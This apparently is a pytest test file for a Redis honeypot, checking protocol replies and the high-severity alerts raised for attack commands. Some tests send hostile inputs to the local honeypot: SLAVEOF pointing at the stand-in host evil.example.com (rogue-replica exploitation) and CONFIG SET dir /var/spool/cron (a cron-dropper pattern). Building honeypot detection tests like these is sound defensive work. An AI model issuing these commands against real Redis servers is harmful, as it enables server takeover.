"""Redis honeypot tests.

Verifies RESP parsing for both inline and array command forms, and that
each modelled verb produces the right response shape + alert severity.
"""

import asyncio
import contextlib
import os
import socket

import pytest

os.environ["DATABASE_URL"] = "sqlite+aiosqlite:///:memory:"


def _free_port() -> int:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


@pytest.fixture(autouse=True)
async def setup_db():
    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import close_db, init_db

    event_buffer.reset_for_tests()
    await init_db()
    yield
    event_buffer.reset_for_tests()
    await close_db()


@pytest.fixture
async def redis_server():
    from honeypot_mcp.engines.redis import RedisEngine
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Honeypot, HoneypotType

    port = _free_port()
    async with get_session() as session:
        hp = Honeypot(name="redis-test", type=HoneypotType.REDIS, port=port)
        session.add(hp)
        await session.flush()

    engine = RedisEngine()
    cid = await engine.start("redis-test", port, {})
    try:
        yield port
    finally:
        await engine.stop(cid)


def _resp_array(*parts: bytes) -> bytes:
    """Build an RESP array request: `*N\\r\\n$len\\r\\nvalue\\r\\n…`."""
    out = f"*{len(parts)}\r\n".encode()
    for p in parts:
        out += f"${len(p)}\r\n".encode() + p + b"\r\n"
    return out


@pytest.mark.asyncio
async def test_redis_ping_pong_inline(redis_server):
    """Inline command form: `PING\\r\\n` → `+PONG\\r\\n`."""
    port = redis_server
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    try:
        writer.write(b"PING\r\n")
        await writer.drain()
        resp = await asyncio.wait_for(reader.readline(), timeout=2.0)
        assert resp == b"+PONG\r\n"
    finally:
        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()


@pytest.mark.asyncio
async def test_redis_ping_pong_array(redis_server):
    """Array command form (what redis-cli sends)."""
    port = redis_server
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    try:
        writer.write(_resp_array(b"PING"))
        await writer.drain()
        resp = await asyncio.wait_for(reader.readline(), timeout=2.0)
        assert resp == b"+PONG\r\n"
    finally:
        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()


@pytest.mark.asyncio
async def test_redis_auth_returns_wrongpass(redis_server):
    """AUTH must reply -WRONGPASS so brute force tools keep trying."""
    port = redis_server
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    try:
        writer.write(_resp_array(b"AUTH", b"hunter2"))
        await writer.drain()
        resp = await asyncio.wait_for(reader.readline(), timeout=2.0)
        assert resp.startswith(b"-WRONGPASS"), resp
    finally:
        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()


@pytest.mark.asyncio
async def test_redis_info_returns_version_block(redis_server):
    """INFO must return a bulk string with a believable redis_version."""
    port = redis_server
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    try:
        writer.write(b"INFO\r\n")
        await writer.drain()
        # Read header line: `$<len>\r\n`
        header = await asyncio.wait_for(reader.readline(), timeout=2.0)
        assert header.startswith(b"$"), header
        body_len = int(header[1:].strip())
        body = await asyncio.wait_for(reader.readexactly(body_len), timeout=2.0)
        await reader.readexactly(2)  # trailing CRLF
        assert b"redis_version:" in body
        assert b"role:master" in body
    finally:
        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()


@pytest.mark.asyncio
async def test_redis_slaveof_triggers_high_severity_alert(redis_server):
    """SLAVEOF/REPLICAOF is the rogue-replica exploit path — should be HIGH."""
    from sqlalchemy import select

    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert

    port = redis_server
    buf = event_buffer.get_buffer()
    await buf.start()
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        try:
            writer.write(_resp_array(b"SLAVEOF", b"evil.example.com", b"6379"))
            await writer.drain()
            resp = await asyncio.wait_for(reader.readline(), timeout=2.0)
            assert resp == b"+OK\r\n"
        finally:
            writer.close()
            with contextlib.suppress(Exception):
                await writer.wait_closed()
        await asyncio.sleep(1.2)
    finally:
        await buf.stop()

    async with get_session() as session:
        result = await session.execute(
            select(Alert).where(Alert.event_type == "redis_rogue_replica")
        )
        events = list(result.scalars().all())

    assert len(events) == 1
    assert events[0].severity.value == "high"
    assert events[0].payload["args"] == ["evil.example.com", "6379"]


@pytest.mark.asyncio
async def test_redis_config_set_dir_triggers_high(redis_server):
    """`CONFIG SET dir /var/spool/cron` is the Mirai dropper pattern — HIGH."""
    from sqlalchemy import select

    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert

    port = redis_server
    buf = event_buffer.get_buffer()
    await buf.start()
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        try:
            writer.write(_resp_array(b"CONFIG", b"SET", b"dir", b"/var/spool/cron"))
            await writer.drain()
            resp = await asyncio.wait_for(reader.readline(), timeout=2.0)
            assert resp == b"+OK\r\n"
        finally:
            writer.close()
            with contextlib.suppress(Exception):
                await writer.wait_closed()
        await asyncio.sleep(1.2)
    finally:
        await buf.stop()

    async with get_session() as session:
        result = await session.execute(select(Alert).where(Alert.event_type == "redis_config_set"))
        events = list(result.scalars().all())
    assert len(events) == 1
    assert events[0].severity.value == "high"
    assert events[0].payload["parameter"] == "dir"


@pytest.mark.asyncio
async def test_redis_eval_captures_script_body(redis_server):
    """EVAL must capture the Lua script body — that's the sandbox-escape
    research target. Severity HIGH."""
    from sqlalchemy import select

    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert

    port = redis_server
    buf = event_buffer.get_buffer()
    await buf.start()
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        try:
            script = b'redis.call("SET","x",1); return redis.status_reply("OK")'
            writer.write(_resp_array(b"EVAL", script, b"0"))
            await writer.drain()
            resp = await asyncio.wait_for(reader.readline(), timeout=2.0)
            assert resp.startswith(b"-ERR")
        finally:
            writer.close()
            with contextlib.suppress(Exception):
                await writer.wait_closed()
        await asyncio.sleep(1.2)
    finally:
        await buf.stop()

    async with get_session() as session:
        result = await session.execute(select(Alert).where(Alert.event_type == "redis_eval"))
        events = list(result.scalars().all())
    assert len(events) == 1
    assert b"redis.call" in events[0].payload["script_preview"].encode()
    assert events[0].severity.value == "high"
